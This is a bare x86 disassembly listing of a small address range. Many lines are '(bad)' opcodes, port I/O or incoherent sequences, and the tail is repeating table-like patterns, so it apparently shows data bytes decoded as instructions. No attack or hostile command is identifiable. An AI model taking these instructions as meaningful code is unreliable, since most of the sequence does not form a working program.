  42c7ad:	xor    edi,edi
  42c7af:	pushf  
  42c7b0:	or     BYTE PTR [ebp+0x6c],dh
  42c7b3:	push   0xf88b85ff
  42c7b8:	or     BYTE PTR [ebp+0xb],dh
  42c7bb:	inc    edi
  42c7bd:	or     dh,al
  42c7bf:	jb     0x42c789
  42c7c1:	call   DWORD PTR [eax]
  42c7c3:	mov    DWORD PTR [ebp+0x24],eax
  42c7c6:	mov    ebp,ebx
  42c7c8:	adc    bh,bh
  42c7ca:	(bad)  
  42c7cb:	and    al,0xc6
  42c7cd:	lea    ebp,[edi+0x1fffc24]
  42c7d3:	or     BYTE PTR [esi+0x74],bl
  42c7d6:	ret    0x20
  42c7d9:	je     0x42c766
  42c7db:	sbb    al,0x83
  42c7dd:	mov    edi,0xe8ecfff8
  42c7e2:	mov    ecx,0xf81485ff
  42c7e7:	je     0x42c772
  42c7e9:	pop    esp
  42c7ea:	and    al,0x75
  42c7ec:	push   esi
  42c7ed:	and    al,0x8d
  42c7ef:	and    al,0xff
  42c7f1:	inc    BYTE PTR [ebx+ecx*4+0x18]
  42c7f5:	and    al,0x7c
  42c7f7:	pop    edi
  42c7f8:	adc    BYTE PTR [ebx+0x57],bl
  42c7fb:	in     eax,0x51
  42c7fd:	ret    0x33
  42c800:	mov    esi,0x187200
  42c805:	pushf  
  42c806:	inc    BYTE PTR [ecx+0x1614857c]
  42c80c:	jge    0x42c7aa
  42c80e:	mov    DWORD PTR [esp],ecx
  42c811:	(bad)  
  42c812:	cmp    DWORD PTR [eax],ebx
  42c814:	adc    BYTE PTR [eax],bl
  42c816:	push   ss
  42c817:	dec    DWORD PTR [edi+edi*8+0x18]
  42c81b:	adc    al,0xca
  42c81d:	mov    edx,DWORD PTR [esp+ecx*1+0x10]
  42c821:	into   
  42c822:	scas   eax,DWORD PTR es:[edi]
  42c823:	mov    DWORD PTR [eax+edx*2],esp
  42c826:	das    
  42c827:	inc    ebp
  42c828:	jne    0x42c7b5
  42c82a:	and    al,0x8b
  42c82c:	and    al,0x33
  42c82e:	lea    ecx,[eax]
  42c830:	jb     0x42c876
  42c832:	xor    ebp,ebx
  42c834:	adc    al,bh
  42c836:	xor    bh,bh
  42c838:	jne    0x42c87e
  42c83a:	sbb    al,0xff
  42c83c:	call   0x52a02685
  42c841:	push   ebx
  42c842:	inc    esp
  42c843:	push   ebx
  42c844:	xor    ah,bh
  42c846:	xchg   edx,eax
  42c847:	das    
  42c848:	pop    ecx
  42c849:	in     al,0x9c
  42c84b:	dec    edi
  42c84c:	mov    cl,0xa1
  42c84e:	and    eax,0x135c826f
  42c853:	xchg   esi,eax
  42c854:	add    al,0x0
  42c856:	add    BYTE PTR [eax],al
  42c858:	push   esp
  42c859:	cmp    bl,BYTE PTR [esi+esi*2+0x6c]
  42c85d:	popa   
  42c85e:	inc    ebp
  42c85f:	jns    0x42c8d1
  42c861:	addr16 ja 0x42c8da
  42c864:	pop    esp
  42c865:	ja     0x42c8b8
  42c867:	arpl   WORD PTR [ebx+0x49],bp
  42c86a:	jne    0x42c8dc
  42c86c:	dec    ebx
  42c86d:	dec    ecx
  42c86e:	ins    DWORD PTR es:[edi],dx
  42c86f:	addr16 dec ebp
  42c871:	pop    esp
  42c872:	push   0x6a
  42c874:	jne    0x42c8e2
  42c876:	push   0x49
  42c878:	imul   ebp,DWORD PTR [ebx+0x63],0x7a
  42c87c:	ins    BYTE PTR es:[edi],dx
  42c87d:	cs jo  0x42c8e4
  42c880:	bound  eax,QWORD PTR [eax]
  42c882:	cmp    BYTE PTR [edx+0x10],0x0
  42c886:	ins    DWORD PTR es:[edi],dx
  42c887:	das    
  42c888:	adc    BYTE PTR [eax],al
  42c88a:	jmp    0x42c8d5
  42c88c:	adc    BYTE PTR [eax],al
  42c88e:	jecxz  0x42c8f0
  42c890:	adc    BYTE PTR [eax],al
  42c892:	adc    BYTE PTR [edx+0x10],dh
  42c895:	add    bl,bh
  42c897:	pop    edi
  42c898:	adc    BYTE PTR [eax],al
  42c89a:	xlat   BYTE PTR ds:[ebx]
  42c89b:	push   es
  42c89c:	adc    BYTE PTR [eax],al
  42c89e:	cwde   
  42c89f:	add    DWORD PTR [eax],edx
  42c8a1:	add    cl,al
  42c8a3:	xchg   edx,eax
  42c8a4:	inc    edx
  42c8a5:	add    ch,al
  42c8a7:	xchg   edx,eax
  42c8a8:	inc    edx
  42c8a9:	add    cl,cl
  42c8ab:	xchg   edx,eax
  42c8ac:	inc    edx
  42c8ad:	add    ch,cl
  42c8af:	xchg   edx,eax
  42c8b0:	inc    edx
  42c8b1:	add    cl,dl
  42c8b3:	xchg   edx,eax
  42c8b4:	inc    edx
  42c8b5:	add    ch,dl
  42c8b7:	xchg   edx,eax
  42c8b8:	inc    edx
  42c8b9:	add    cl,bl
  42c8bb:	xchg   edx,eax
  42c8bc:	inc    edx
  42c8bd:	add    ch,bl
  42c8bf:	xchg   edx,eax
  42c8c0:	inc    edx
  42c8c1:	add    BYTE PTR [edx-0x79ffbd38],al
  42c8c7:	enter  0x42,0x8a
  42c8cb:	enter  0x42,0x8e
  42c8cf:	enter  0x42,0x92
  42c8d3:	enter  0x42,0x96
  42c8d7:	enter  0x42,0x9a
  42c8db:	enter  0x42,0x9e
  42c8df:	enter  0x42,0x0
  42c8e3:	add    BYTE PTR [eax],al
  42c8e5:	add    BYTE PTR [eax],al
  42c8e7:	add    BYTE PTR [eax],al
  42c8e9:	add    BYTE PTR [eax+eax*1],al
	...
